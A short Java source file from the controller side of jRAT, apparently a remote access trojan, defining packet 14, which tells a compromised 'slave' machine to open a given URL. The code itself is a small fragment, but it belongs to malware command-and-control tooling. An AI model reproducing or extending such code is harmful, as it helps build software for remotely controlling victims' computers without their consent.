package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet14VisitURL extends AbstractOutgoingPacket {

	private String url;

	public Packet14VisitURL(String url) {
		this.url = url;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
	}

	@Override
	public short getPacketId() {
		return 14;
	}

}
